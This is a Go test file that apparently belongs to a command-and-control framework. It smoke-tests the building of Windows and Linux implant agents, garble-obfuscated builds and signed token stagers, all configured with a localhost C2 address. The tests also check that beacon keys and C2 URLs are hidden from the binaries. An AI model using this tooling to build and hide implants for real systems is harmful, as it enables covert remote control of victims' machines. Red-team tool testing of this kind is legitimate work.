package payload

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"
)

// Smoke test: generate a real Windows agent with the config-blob ldflags to
// ensure the full build pipeline (go mod tidy + go build + blob injection)
// produces a working binary on supported Windows arches, and that unsupported
// arches (386) are rejected loudly rather than silently built as amd64.
func TestSmokeGenerateWindowsEXE(t *testing.T) {
	if os.Getenv("FORGEC2_SMOKE_BUILD") != "1" {
		t.Skip("set FORGEC2_SMOKE_BUILD=1 to run the real agent build")
	}
	for _, tc := range []struct {
		arch    string
		wantErr bool
	}{
		{"amd64", false},
		{"arm64", false},
		{"386", true},
	} {
		t.Run("windows-"+tc.arch, func(t *testing.T) {
			outDir := t.TempDir()
			cfg := ImplantConfig{
				C2URL:           "http://127.0.0.1:8080",
				Protocol:        "http",
				Interval:        9,
				Jitter:          30,
				UserAgent:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
				Persist:         false,
				BeaconKey:       "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
				ListenerID:      1,
				Filename:        "smoketest",
				BeaconTransport: "http",
				Architecture:    tc.arch,
			}
			path, err := GenerateWindowsEXE(cfg, outDir)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("GenerateWindowsEXE(%s) expected rejection, got path %q", tc.arch, path)
				}
				return
			}
			if err != nil {
				t.Fatalf("GenerateWindowsEXE(%s) failed: %v", tc.arch, err)
			}
			if _, err := os.Stat(path); err != nil {
				t.Fatalf("output missing: %v", err)
			}
			// The config-blob approach must not leave plaintext secrets in the binary.
			exe, err := os.ReadFile(path)
			if err != nil {
				t.Fatalf("read output: %v", err)
			}
			for _, secret := range []string{cfg.BeaconKey, cfg.C2URL} {
				if bytes.Contains(exe, []byte(secret)) {
					t.Errorf("binary leaks plaintext config value %q", secret)
				}
			}
			t.Logf("built %s size=%d", filepath.Base(path), fileSize(path))
		})
	}
}

func fileSize(p string) int64 {
	fi, _ := os.Stat(p)
	if fi == nil {
		return 0
	}
	return fi.Size()
}

// TestSmokeLinuxELFSmoke verifies the Linux ELF agent pipeline (linux sources
// cross-compiled from the host, no CGO) produces a real ELF binary.
func TestSmokeLinuxELFSmoke(t *testing.T) {
	if os.Getenv("FORGEC2_SMOKE_BUILD") != "1" {
		t.Skip("set FORGEC2_SMOKE_BUILD=1 to run the real agent build")
	}
	outDir := t.TempDir()
	cfg := ImplantConfig{
		C2URL:           "http://127.0.0.1:8080",
		Protocol:        "http",
		Interval:        15,
		Jitter:          25,
		UserAgent:       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		BeaconKey:       "112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00",
		ListenerID:      1,
		Filename:        "smoketest-elf",
		BeaconTransport: "http",
		Architecture:    "amd64",
	}
	path, err := GenerateLinuxELF(cfg, outDir)
	if err != nil {
		t.Fatalf("GenerateLinuxELF failed: %v", err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read output: %v", err)
	}
	if len(data) < 4 || string(data[:4]) != "\x7fELF" {
		t.Fatalf("output is not an ELF binary (magic=%x)", data[:min(len(data), 4)])
	}
	for _, secret := range []string{cfg.BeaconKey, cfg.C2URL} {
		if bytes.Contains(data, []byte(secret)) {
			t.Errorf("binary leaks plaintext config value %q", secret)
		}
	}
	t.Logf("built %s size=%d", filepath.Base(path), fileSize(path))
}

// TestSmokeObfuscatedBuild verifies the garble path end-to-end (obfuscate=true)
// for Windows EXE and Linux ELF. Requires garble in PATH; skipped otherwise.
func TestSmokeObfuscatedBuild(t *testing.T) {
	if os.Getenv("FORGEC2_SMOKE_BUILD") != "1" {
		t.Skip("set FORGEC2_SMOKE_BUILD=1 to run the real agent build")
	}
	if getGarbleCmd() == "" {
		t.Skip("garble not installed; skipping obfuscated build smoke")
	}

	for _, tc := range []struct {
		name string
		fn   func(ImplantConfig, string) (string, error)
	}{
		{"windows-exe", func(c ImplantConfig, dir string) (string, error) { return GenerateWindowsEXE(c, dir) }},
		{"linux-elf", func(c ImplantConfig, dir string) (string, error) { return GenerateLinuxELF(c, dir) }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			outDir := t.TempDir()
			cfg := ImplantConfig{
				C2URL:           "http://127.0.0.1:8080",
				Protocol:        "http",
				Interval:        9,
				Jitter:          30,
				UserAgent:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
				BeaconKey:       "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
				ListenerID:      1,
				Filename:        "obfsmoke",
				BeaconTransport: "http",
				Architecture:    "amd64",
				Obfuscate:       true,
			}
			path, err := tc.fn(cfg, outDir)
			if err != nil {
				t.Fatalf("obfuscated build failed: %v", err)
			}
			data, err := os.ReadFile(path)
			if err != nil {
				t.Fatalf("read output: %v", err)
			}
			// garble -literals must hide the config secrets from the artifact.
			for _, secret := range []string{cfg.BeaconKey, cfg.C2URL} {
				if bytes.Contains(data, []byte(secret)) {
					t.Errorf("obfuscated binary leaks plaintext config value %q", secret)
				}
			}
			t.Logf("built %s size=%d", filepath.Base(path), fileSize(path))
		})
	}
}

// TestSmokeTokenStagerBuild verifies the signed /stage token stagers build for
// both Windows and Linux with the fetch parameters injected via ldflags.
func TestSmokeTokenStagerBuild(t *testing.T) {
	if os.Getenv("FORGEC2_SMOKE_BUILD") != "1" {
		t.Skip("set FORGEC2_SMOKE_BUILD=1 to run the real stager build")
	}
	SetStagerKey(bytes.Repeat([]byte{0x42}, 32))

	token, sig, keyHex, err := NewStageToken()
	if err != nil {
		t.Fatalf("NewStageToken: %v", err)
	}
	if !VerifyStageSignature(token, sig) {
		t.Fatal("signature does not verify")
	}

	fetch := StagerFetch{
		BaseURL: "http://127.0.0.1:8080",
		Token:   token,
		Sig:     sig,
		KeyHex:  keyHex,
	}

	for _, tc := range []struct {
		goos string
		fn   func(ImplantConfig, string, StagerFetch) (string, error)
	}{
		{"windows", GenerateTokenStager},
		{"linux", GenerateTokenStagerLinux},
	} {
		outDir := t.TempDir()
		cfg := ImplantConfig{Filename: "tokstager", C2URL: "http://127.0.0.1:8080/http"}
		cfg.Protocol = "http"
		path, err := tc.fn(cfg, outDir, fetch)
		if err != nil {
			t.Fatalf("GenerateTokenStager(%s) failed: %v", tc.goos, err)
		}
		if _, err := os.Stat(path); err != nil {
			t.Fatalf("output missing for %s: %v", tc.goos, err)
		}
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("read output: %v", err)
		}
		if !bytes.Contains(data, []byte(token)) {
			t.Fatalf("%s stager does not embed the stage token", tc.goos)
		}
		if !bytes.Contains(data, []byte(keyHex)) {
			t.Fatalf("%s stager does not embed the stage key", tc.goos)
		}
		t.Logf("built %s size=%d", filepath.Base(path), fileSize(path))
	}
}
